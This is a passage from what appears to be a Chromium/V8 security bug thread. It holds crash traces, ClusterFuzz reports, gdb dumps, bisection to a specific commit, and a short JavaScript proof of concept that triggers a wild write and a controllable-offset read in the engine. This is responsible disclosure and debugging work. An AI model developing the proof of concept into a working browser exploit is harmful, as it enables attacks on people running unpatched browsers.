    #46 0x5555576692cc in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastHoleyObjectElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)3>>::DirectCollectElementIndicesImpl(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSObject>, v8::internal::Handle<v8::internal::FixedArrayBase>, v8::internal::GetKeysConversion, v8::internal::PropertyFilter, v8::internal::Handle<v8::internal::FixedArray>, unsigned int*, unsigned int) v8/src/objects/elements.cc:1268:35
    #47 0x5555576639b3 in PrependElementIndicesImpl v8/src/objects/elements.cc:1331:21
    #48 0x5555576639b3 in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastHoleyObjectElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)3>>::PrependElementIndices(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSObject>, v8::internal::Handle<v8::internal::FixedArrayBase>, v8::internal::Handle<v8::internal::FixedArray>, v8::internal::GetKeysConversion, v8::internal::PropertyFilter) v8/src/objects/elements.cc:1286:12
    #49 0x555557a6bcce in PrependElementIndices v8/src/objects/elements-inl.h:27:10
    #50 0x555557a6bcce in v8::internal::MaybeHandle<v8::internal::FixedArray> v8::internal::(anonymous namespace)::GetOwnKeysWithElements<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSObject>, v8::internal::GetKeysConversion, bool) v8/src/objects/keys.cc:436:24
    #51 0x555557a62146 in GetKeys v8/src/objects/keys.cc:458:9
    #52 0x555557a62146 in v8::internal::KeyAccumulator::GetKeys(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSReceiver>, v8::internal::KeyCollectionMode, v8::internal::PropertyFilter, v8::internal::GetKeysConversion, bool, bool) v8/src/objects/keys.cc:103:22
    #53 0x5555574de18a in v8::internal::JsonStringifier::SerializeJSReceiverSlow(v8::internal::Handle<v8::internal::JSReceiver>) v8/src/json/json-stringifier.cc:1358:5
    #54 0x555557500a0b in SerializeJSObject v8/src/json/json-stringifier.cc:1284:21
    #55 0x555557500a0b in v8::internal::JsonStringifier::Result v8::internal::JsonStringifier::Serialize_<true>(v8::internal::Handle<v8::internal::Object>, bool, v8::internal::Handle<v8::internal::Object>) v8/src/json/json-stringifier.cc:975:16
    #56 0x55555750157c in SerializeProperty v8/src/json/json-stringifier.cc:72:12
    #57 0x55555750157c in SerializeJSObject v8/src/json/json-stringifier.cc:1343:21
    #58 0x55555750157c in v8::internal::JsonStringifier::Result v8::internal::JsonStringifier::Serialize_<true>(v8::internal::Handle<v8::internal::Object>, bool, v8::internal::Handle<v8::internal::Object>) v8/src/json/json-stringifier.cc:975:16
    #59 0x5555574de4b0 in SerializeProperty v8/src/json/json-stringifier.cc:72:12
    #60 0x5555574de4b0 in v8::internal::JsonStringifier::SerializeJSReceiverSlow(v8::internal::Handle<v8::internal::JSReceiver>) v8/src/json/json-stringifier.cc:1374:21
    #61 0x5555574e787f in SerializeJSObject v8/src/json/json-stringifier.cc:1284:21
    #62 0x5555574e787f in v8::internal::JsonStringifier::Result v8::internal::JsonStringifier::Serialize_<false>(v8::internal::Handle<v8::internal::Object>, bool, v8::internal::Handle<v8::internal::Object>) v8/src/json/json-stringifier.cc:975:16
    #63 0x5555574c9043 in SerializeObject v8/src/json/json-stringifier.cc:55:12
    #64 0x5555574c9043 in v8::internal::JsonStringifier::Stringify(v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>) v8/src/json/json-stringifier.cc:514:19
    #65 0x5555574c8ec6 in v8::internal::JsonStringify(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>) v8/src/json/json-stringifier.cc:441:22
    #66 0x555556b62a7b in v8::internal::Builtin_Impl_JsonStringify(v8::internal::BuiltinArguments, v8::internal::Isolate*) v8/src/builtins/builtins-json.cc:37:3
    #67 0x55555b08aa35 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #68 0x55555afe6a5d in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #69 0x5555bafc20d6  (<unknown module>)
    #70 0x55555afe461b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #71 0x55555afe435e in Builtins_JSEntry setup-isolate-deserialize.cc
    #72 0x555556e5c295 in Call v8/src/execution/simulator.h:191:12
    #73 0x555556e5c295 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:420:22
    #74 0x555556e5eb11 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::Handle<v8::internal::JSFunction>, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>) v8/src/execution/execution.cc:517:10
    #75 0x5555569951be in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:2140:7
    #76 0x55555690c188 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1013:44
    #77 0x55555693bed6 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:4914:10
    #78 0x555556948010 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:5848:37
    #79 0x555556947621 in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:5757:18
    #80 0x55555694acc0 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:6610:18
    #81 0x7ffff7c2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #82 0x7ffff7c2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #83 0x555556805029 in _start (/home/alan/chromium/src/tools/get_asan_chrome/d8+0x12b1029) (BuildId: 63f46e8bb48b73e5)

Address 0x7af70090ad34 is a wild pointer inside of access range of size 0x000000000001.
SUMMARY: AddressSanitizer: negative-size-param v8/src/utils/memcopy.h in MemCopy
==957954==ABORTING

I am now going to work backwards to try and see how far back it goes manually, since bisecting isnt producing a plausible looking result to my eyes.

### al...@goodmanemail.com (2024-12-20)

M129 crashes
M128 crashes
M127 crashes
M126 doesnt crash
M125 doesnt crash

I am re running the bisect because I lost the result.  It bisected back to a commit towards the start of July; which based the above is actually plausible.  I just didnt think when I saw it that it could be correct as its months ago and I almost never find anything that old.  Will reply again when it completes, or edit if its not been triaged still.

### al...@goodmanemail.com (2024-12-20)

8f7698c8389fbe5b585c97d512dd11b77e32d011 is the first bad commit
commit 8f7698c8389fbe5b585c97d512dd11b77e32d011
Author: Toon Verwaest <verwaest@chromium.org>
Date:   Mon Jun 3 10:47:02 2024 +0200

    Use framesize + max outgoing args to check stack limits
    
    Now we compute the max number of outgoing arguments during bytecode compilation, and store this value on the bytecode array. It's reused by sparkplug; and by the optimizing compiler to ensure they can compute the right max unoptimized frame size for stack checks.
    
    Bug: 341216494
    Change-Id: I16e2582e397d8c7847a40e58a8a1b45be880333f
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5577683
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org>
    Reviewed-by: Victor Gomes <victorgomes@chromium.org>
    Commit-Queue: Toon Verwaest <verwaest@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#94196}

 src/baseline/arm/baseline-compiler-arm-inl.h       |  3 +-
 src/baseline/arm64/baseline-compiler-arm64-inl.h   |  3 +-
 src/baseline/baseline-compiler.cc                  | 23 -------------
 src/baseline/baseline-compiler.h                   |  6 ----
 src/baseline/ia32/baseline-compiler-ia32-inl.h     |  3 +-
 src/baseline/x64/baseline-compiler-x64-inl.h       |  3 +-
 src/builtins/arm/builtins-arm.cc                   |  7 ++--
 src/builtins/arm64/builtins-arm64.cc               | 39 +++++-----------------
 src/builtins/ia32/builtins-ia32.cc                 |  8 ++---
 src/builtins/x64/builtins-x64.cc                   |  8 ++---
 src/codegen/arm/macro-assembler-arm.cc             |  4 ---
 src/codegen/arm/macro-assembler-arm.h              |  2 +-
 src/codegen/ia32/macro-assembler-ia32.cc           |  8 -----
 src/codegen/ia32/macro-assembler-ia32.h            |  2 +-
 src/codegen/x64/macro-assembler-x64.cc             |  8 -----
 src/codegen/x64/macro-assembler-x64.h              |  2 +-
 src/compiler/backend/code-generator.cc             |  5 ---
 src/compiler/backend/instruction-selector.cc       | 16 +++++----
 src/compiler/backend/instruction.cc                |  9 ++---
 src/compiler/backend/instruction.h                 | 12 ++++---
 src/compiler/bytecode-graph-builder.cc             |  4 +--
 src/compiler/common-operator.cc                    | 10 +++---
 src/compiler/common-operator.h                     |  6 ++--
 src/compiler/frame-states.cc                       |  4 +--
 src/compiler/frame-states.h                        | 21 ++++++++----
 src/compiler/heap-refs.cc                          |  5 ++-
 src/compiler/heap-refs.h                           |  3 +-
 src/compiler/js-call-reducer.cc                    |  2 +-
 src/compiler/js-inlining.cc                        |  5 +--
 .../turboshaft/maglev-graph-building-phase.cc      | 22 +++++++-----
 src/heap/factory-base.cc                           |  4 ++-
 src/heap/factory-base.h                            |  3 +-
 src/heap/factory.cc                                |  1 +
 src/interpreter/bytecode-array-builder.cc          |  6 ++--
 src/interpreter/bytecode-array-builder.h           |  6 ++++
 src/interpreter/bytecode-array-writer.cc           |  8 ++---
 src/interpreter/bytecode-array-writer.h            |  1 +
 src/interpreter/bytecode-generator.cc              |  1 +
 src/maglev/maglev-code-gen-state.h                 |  5 ---
 src/maglev/maglev-compilation-unit.cc              |  4 ++-
 src/maglev/maglev-compilation-unit.h               | 15 +++++----
 src/maglev/maglev-compiler.cc                      |  4 ++-
 src/maglev/maglev-graph-builder.cc                 |  2 +-
 src/objects/bytecode-array-inl.h                   | 30 ++++++++++-------
 src/objects/bytecode-array.h                       | 11 ++++--
 src/objects/bytecode-array.tq                      |  3 +-
 src/wasm/turboshaft-graph-interface.cc             |  2 +-
 test/cctest/heap/test-heap.cc                      |  7 ++--
 .../backend/instruction-selector-unittest.cc       |  7 ++--
 .../backend/instruction-selector-unittest.h        |  4 +--
 .../turboshaft-instruction-selector-unittest.cc    |  7 ++--
 .../turboshaft-instruction-selector-unittest.h     |  4 +--
 test/unittests/compiler/graph-unittest.cc          |  2 +-
 .../compiler/js-create-lowering-unittest.cc        |  2 +-
 test/unittests/compiler/turboshaft/reducer-test.h  |  2 +-
 .../interpreter/bytecode-array-writer-unittest.cc  |  8 ++---
 56 files changed, 186 insertions(+), 216 deletions(-)

I bisected between ToT today and 910d84a7f3f5cb75e9ff287ae2ae228d999c6753 which was approximately the oldest version I could get to compile on Ubuntu 24.04.  I bisected using release mode builds since these dont include any checks which might influence the process.  The result appears plausible to me.  I guess I found a bypass for the fix in a832ff96bd41b40b9cfee90a314fa816802cf9ae; or the fix was incomplete?

I also tried with a832ff96bd41b40b9cfee90a314fa816802cf9ae just to make sure the bisect hadnt somehow skipped over that revision / missed anything.  a832ff96bd41b40b9cfee90a314fa816802cf9ae crashes.

### cl...@appspot.gserviceaccount.com (2024-12-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5878792216051712.

### 24...@project.gserviceaccount.com (2024-12-20)

ClusterFuzz testcase 5878792216051712 appears to be flaky, updating reproducibility hotlist.

### 24...@project.gserviceaccount.com (2024-12-20)

Detailed Report: https://clusterfuzz.com/testcase?key=5878792216051712

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x778136340000
Crash State:
  v8::base::Flags<v8::internal::MemoryChunk::Flag, unsigned long, unsigned long>::
  v8::base::Flags<v8::internal::MemoryChunk::Flag, unsigned long, unsigned long>::
  v8::internal::ReadOnlyHeap::Contains
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8&revision=97904

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5878792216051712

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### 24...@project.gserviceaccount.com (2024-12-20)

Detailed Report: https://clusterfuzz.com/testcase?key=5878792216051712

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x778136340000
Crash State:
  v8::base::Flags<v8::internal::MemoryChunk::Flag, unsigned long, unsigned long>::
  v8::base::Flags<v8::internal::MemoryChunk::Flag, unsigned long, unsigned long>::
  v8::internal::ReadOnlyHeap::Contains
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8&revision=97904

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5878792216051712

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### ma...@chromium.org (2024-12-20)

Thanks for the bug report and detailed analysis. ClusterFuzz isn't able to reproduce this reliably using the proof of concept, but it did reproduce it at least once.

Provisionally setting Found In to 127 based on the bisection performed by reporter as ClusterFuzz wasn't able to reproduce it consistently enough to bisect. Leaving Severity as S2 based on ClusterFuzz's analysis.

Sending to V8 sheriff for further triage.

### 24...@project.gserviceaccount.com (2024-12-20)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### al...@goodmanemail.com (2024-12-20)

Is it possible to try a CF run with simpler arguments? Attached test case was selected because it replicates 100% reliably for me in a variety of ways, as discussed in previous comments. It only needs --allow-natives-syntax and --jit-fuzzing

### cl...@appspot.gserviceaccount.com (2024-12-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5817760948879360.

### ma...@chromium.org (2024-12-20)

Thanks for the suggestion, it looks like it is making better progress this time around.

### al...@goodmanemail.com (2024-12-20)

This run is mirroring the behavior I see.  Do note though; that depending on sanitizer/check options selected youll get different exploit primitives revealed.  As previously discussed in comments 1-4.

### 24...@project.gserviceaccount.com (2024-12-21)

Detailed Report: https://clusterfuzz.com/testcase?key=5817760948879360

Fuzzer: None
Job Type: linux_asan_d8_noflags
Platform Id: linux

Crash Type: Negative-size-param
Crash Address: 
Crash State:
  v8::internal::MemCopy
  heap::base::SlotCallbackResult v8::internal::Scavenger::ScavengeObject<v8::inter
  void v8::internal::BodyDescriptorBase::IteratePointers<v8::internal::ScavengeVis
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_noflags&range=96181:96182

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5817760948879360

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### al...@goodmanemail.com (2024-12-21)

It seems the 8A2 testcase negative-param-size variant may date to september.

I just double checked the indicated hash 158960db1b054238d25ef300ef18121f643e2666 and the wild write is replicated under this build; in release type builds (eg no checks, dchecks, sanitizers).

### al...@goodmanemail.com (2024-12-21)

deleted

### pe...@google.com (2024-12-21)

Setting milestone because of s2 severity.

### pe...@google.com (2024-12-21)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### al...@goodmanemail.com (2024-12-23)

Simplified repro:

function f20(a21, a22, a23) {
    const v25 = [];
    function f27() {
        return arguments;
    }
    arr = [];
    arr.length = 65521;
    const v34 = f27.bind(null, ...arr, ..."setUint32", 10000000);
    function f35() {
        return v34(f35, v25, f35, arr);
    }
    const v37 = %PrepareFunctionForOptimization(f35);
    f35();
    const v39 = %OptimizeFunctionOnNextCall(f35);
    f35();
    function F41() {
        if (!new.target) { throw 'must be called with new'; }
        const v43 = [this,this,this];
        function f44(a45, a46) {
            this.console.profile(a46, a45, v43);
        }
       f44();
    }
    new F41();
}
f20(f20, -5179);

Crashes release build.  Looks like a wild write.  Also whilst not necessary for reproduction --turbofan --no-maglev provide simplified traces:

#0  0x0000555556b08409 in v8::internal::SemiSpaceObjectIterator::Next() ()
#1  0x0000555556aa1c3d in v8::internal::HeapObjectIterator::Next() ()
#2  0x00005555569fbb38 in v8::internal::Isolate::CollectSourcePositionsForAllBytecodeArrays() ()
#3  0x0000555556de5deb in v8::internal::ProfilingScope::ProfilingScope(v8::internal::Isolate*, v8::internal::ProfilerListener*) ()
#4  0x0000555556de7e5c in v8::internal::CpuProfiler::EnableLogging() ()
#5  0x0000555556de8775 in v8::internal::CpuProfiler::StartProcessorIfNotStarted() ()
#6  0x0000555556de86e2 in v8::internal::CpuProfiler::StartProfiling(char const*, v8::CpuProfilingOptions, std::__Cr::unique_ptr<v8::DiscardedSamplesDelegate, std::__Cr::default_delete<v8::DiscardedSamplesDelegate> >) ()
#7  0x0000555556de8908 in v8::internal::CpuProfiler::StartProfiling(v8::internal::Tagged<v8::internal::String>, v8::CpuProfilingOptions, std::__Cr::unique_ptr<v8::DiscardedSamplesDelegate, std::__Cr::default_delete<v8::DiscardedSamplesDelegate> >) ()
#8  0x000055555681b9ce in v8::CpuProfiler::StartProfiling(v8::Local<v8::String>, v8::CpuProfilingOptions, std::__Cr::unique_ptr<v8::DiscardedSamplesDelegate, std::__Cr::default_delete<v8::DiscardedSamplesDelegate> >) ()
#9  0x00005555567ab6a7 in v8::D8Console::Profile(v8::debug::ConsoleCallArguments const&, v8::debug::ConsoleContext const&) ()
#10 0x000055555686034f in v8::internal::(anonymous namespace)::ConsoleCall(v8::internal::Isolate*, v8::internal::BuiltinArguments const&, void (v8::debug::ConsoleDelegate::*)(v8::debug::ConsoleCallArguments const&, v8::debug::ConsoleContext const&)) ()
#11 0x000055555685d0f5 in v8::internal::Builtin_ConsoleProfile(int, unsigned long*, v8::internal::Isolate*) ()
#12 0x0000555557c9cd36 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit ()
#13 0x0000555557bf891e in Builtins_InterpreterEntryTrampoline ()


### pe...@google.com (2025-01-04)

cffsmith: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### cf...@google.com (2025-01-04)

Thanks for the report!  

verwaest@, could you PTAL?  

I uploaded one of the PoCs [here](https://clusterfuzz.com/testcase-detail/5155746014494720) and it bisects to [Use framesize + max outgoing args to check stack limits](https://chromium.googlesource.com/v8/v8/+/8f7698c8389fbe5b585c97d512dd11b77e32d011) which matches with the suggested bad commit in [comment #6](https://issues.chromium.org/issues/385155406#comment6).

### al...@goodmanemail.com (2025-01-04)

Is severity set correctly?  Bot changed it following the initial CF run.  I've got various kinds of crashes which look to originate from this issue in my triage queue - invalid reads (at zero page, offset from zero page, wild) and writes (wild) + lots of different check failed which appear to be memory corruption related to my eyes.

Below is the complete list of SEGV in my triage queue.  Most of these are probably related to this issue; with the probable exception of JSArray; which is a null reref read whose test case doesnt look like this bug.  The others are all invalid reads/writes; mostly wild.  In theory these replicate in release type build.

SEGV in v8::internal::FreeListManyCached::Free(v8::internal::WritableFreeSpace const&, v8::internal::FreeMode)
SEGV in v8::internal::MarkingBarrier::MarkValueLocal(v8::internal::Tagged<v8::internal::HeapObject>)
SEGV in v8::internal::MarkCompactCollector::ProcessMarkingWorklist(v8::base::TimeDelta, unsigned long, v8::internal::MarkCompactCollector::MarkingWorklistProcessingMode)
SEGV in void v8::internal::MarkingVisitorBase<v8::internal::MainMarkingVisitor>::ProcessStrongHeapObject<v8::internal::CompressedHeapObjectSlot>(v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::CompressedHeapObjectSlot, v8::internal::Tagged<v8::internal::HeapObject>)
SEGV in v8::internal::SemiSpaceObjectIterator::Next()
SEGV in v8::internal::HeapObject::SizeFromMap(v8::internal::Tagged<v8::internal::Map>) const
SEGV in v8::internal::JSArray::DefineOwnProperty(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyDescriptor*, v8::Maybe<v8::internal::ShouldThrow>)
SEGV string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:461 in __memcpy_evex_unaligned_erms
SEGV string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:462 in __memcpy_evex_unaligned_erms
SEGV string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:496 in __memcpy_evex_unaligned_erms

As ever, if you would like a specific reproducer please let me know.  

### al...@goodmanemail.com (2025-01-04)

Its also extremely unhelpful that attachments in https://issues.chromium.org/issues/341216494 are deleted.  I thought attachments were an integral part of the reports made and should not be removed except in certain circumstances (eg attached wrong file)?

### al...@goodmanemail.com (2025-01-04)

Looking through the read variant crashers for this one.  Attached one caught my attention because it always crashes at a predictable offset, including in realease type build.  Unfortunately its a crasher inside the 'exploration' framework which I dont understand.  Changing the number at the end (3221225472) changes the offset it tries to read.

Example:

Starting program: /home/alan/v8/v8/out/x64.release/d8 --single-threaded --allow-natives-syntax --jit-fuzzing --disable-in-process-stack-traces controlled_read_mod.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x0000555556a3bd38 in void v8::internal::MarkingVisitorBase<v8::internal::ConcurrentMarkingVisitor>::ProcessStrongHeapObject<v8::internal::OffHeapCompressedMaybeObjectSlot<v8::internal::V8HeapCompressionSchemeImpl<v8::internal::TrustedCage> > >(v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::OffHeapCompressedMaybeObjectSlot<v8::internal::V8HeapCompressionSchemeImpl<v8::internal::TrustedCage> >, v8::internal::Tagged<v8::internal::HeapObject>) ()
(gdb) info registers
rax            0x5555580b5c68      93825037720680
rbx            0x1ca100000565      31477815313765
rcx            0x1ca143330c89      31478942731401
rdx            0x1ca100080300      31477815837440
rsi            0x1ca100080199      31477815837081
rdi            0x55555819b700      93825038661376
rbp            0x7fffffffc340      0x7fffffffc340
rsp            0x7fffffffc310      0x7fffffffc310
r8             0x88112000000000    38299425969274880
r9             0x4                 4
r10            0x1ca100080199      31477815837081
r11            0x1                 1
r12            0x1ca100080300      31477815837440
r13            0x1ca143300000      31478942531584
r14            0x0                 0
r15            0x31d35a            3265370
rip            0x555556a3bd38      0x555556a3bd38 <void v8::internal::MarkingVisitorBase<v8::internal::ConcurrentMarkingVisitor>::ProcessStrongHeapObject<v8::internal::OffHeapCompressedMaybeObjectSlot<v8::internal::V8HeapCompressionSchemeImpl<v8::internal::TrustedCage> > >(v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::OffHeapCompressedMaybeObjectSlot<v8::internal::V8HeapCompressionSchemeImpl<v8::internal::TrustedCage> >, v8::internal::Tagged<v8::internal::HeapObject>)+24>
eflags         0x10206             [ PF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
k0             0xffffc1f8          4294951416
k1             0x7ff               2047
k2             0x10017ff           16783359
k3             0x0                 0
k4             0xffffefff          4294963199
k5             0x0                 0
k6             0x0                 0
k7             0x0                 0
fs_base        0x7ffff7e837c0      140737352579008
gs_base        0x0                 0
(gdb) bt
#0  0x0000555556a3bd38 in void v8::internal::MarkingVisitorBase<v8::internal::ConcurrentMarkingVisitor>::ProcessStrongHeapObject<v8::internal::OffHeapCompressedMaybeObjectSlot<v8::internal::V8HeapCompressionSchemeImpl<v8::internal::TrustedCage> > >(v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::OffHeapCompressedMaybeObjectSlot<v8::internal::V8HeapCompressionSchemeImpl<v8::internal::TrustedCage> >, v8::internal::Tagged<v8::internal::HeapObject>) ()
#1  0x0000555556aedc27 in v8::internal::MarkCompactCollector::ProcessMarkingWorklist(v8::base::TimeDelta, unsigned long, v8::internal::MarkCompactCollector::MarkingWorklistProcessingMode)
    ()
#2  0x0000555556ae8c00 in v8::internal::MarkCompactCollector::ProcessEphemerons() ()
#3  0x0000555556ae8555 in v8::internal::MarkCompactCollector::MarkTransitiveClosureUntilFixpoint() ()
#4  0x0000555556ad8a18 in v8::internal::MarkCompactCollector::MarkLiveObjects() ()
#5  0x0000555556ad74ba in v8::internal::MarkCompactCollector::CollectGarbage() ()
#6  0x0000555556ab22a9 in v8::internal::Heap::MarkCompact() ()
#7  0x0000555556ab15df in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) ()
#8  0x0000555556ac8243 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_1::operator()() const ()
#9  0x0000555556ac7dbf in void heap::base::Stack::SetMarkerAndCallbackImpl<v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_1>(heap::base::Stack*, void*, void const*) ()
#10 0x00005555573995eb in PushAllRegistersAndIterateStack ()
#11 0x0000555556aad19f in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) ()
#12 0x0000555556a90532 in v8::internal::HeapAllocator::AllocateRawWithLightRetrySlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) ()
#13 0x0000555556a91172 in v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) ()
#14 0x0000555556a78468 in v8::internal::Factory::NewMap(v8::internal::DirectHandle<v8::internal::HeapObject>, v8::internal::InstanceType, int, v8::internal::ElementsKind, int, v8::internal::AllocationType) ()
#15 0x0000555556d8ab48 in v8::internal::Map::RawCopy(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, int, int) ()
#16 0x0000555556d8b586 in v8::internal::Map::ShareDescriptor(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::DescriptorArray>, v8::internal::Descriptor*) ()
#17 0x0000555556d87b42 in v8::internal::Map::CopyWithField(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::Handle<v8::internal::FieldType>, v8::internal::PropertyAttributes, v8::internal::PropertyConstness, v8::internal::Representation, v8::internal::TransitionFlag) ()
#18 0x0000555556d8cfa5 in v8::internal::Map::TransitionToDataProperty(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::internal::PropertyConstness, v8::internal::StoreOrigin) ()
#19 0x0000555556d7ecff in v8::internal::LookupIterator::PrepareTransitionToDataProperty(v8::internal::DirectHandle<v8::internal::JSReceiver>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::internal::StoreOrigin) ()
#20 0x0000555556b892ce in v8::internal::StoreIC::LookupForWrite(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin) ()
#21 0x0000555556b8a4c9 in v8::internal::StoreIC::UpdateCaches(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin) ()
#22 0x0000555556b89fb0 in v8::internal::StoreIC::Store(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver> >, v8::internal::Handle<v8::internal::Name>, v8::internal::Handle<v8::internal::Object>, v8::internal::StoreOrigin) ()
#23 0x0000555556b905d9 in v8::internal::Runtime_StoreIC_Miss(int, unsigned long*, v8::internal::Isolate*) ()
